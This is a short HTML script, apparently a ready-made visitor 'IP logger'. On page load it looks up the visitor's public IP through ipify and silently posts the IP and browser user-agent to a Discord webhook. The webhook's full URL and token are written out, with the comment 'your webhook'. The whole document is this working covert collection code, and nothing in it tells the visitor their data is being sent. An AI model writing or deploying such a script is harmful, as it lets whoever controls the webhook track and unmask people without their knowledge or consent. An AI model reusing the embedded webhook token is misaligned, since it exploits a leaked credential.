
<script>
  const WEBHOOK_URL = "https://discord.com/api/webhooks/1467160104033063015/8Pd3NDwOEJQw3RoKl3ip3CNzIcN6NBXTpJqivcrR4-WoY0hyrIVc-8F5jav_U2UeGD2H"; // your webhook

  const userAgent = navigator.userAgent; // gets browser/OS info

  fetch('https://api.ipify.org?format=json')
    .then(res => res.json())
    .then(data => {
      const ip = data.ip;

      return fetch(WEBHOOK_URL, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          content: `New visitor:\nIP: ${ip}\nUser-Agent: ${userAgent}`
        })
      });
    })
    .catch(err => {
      console.error("Error:", err);
    });
</script>
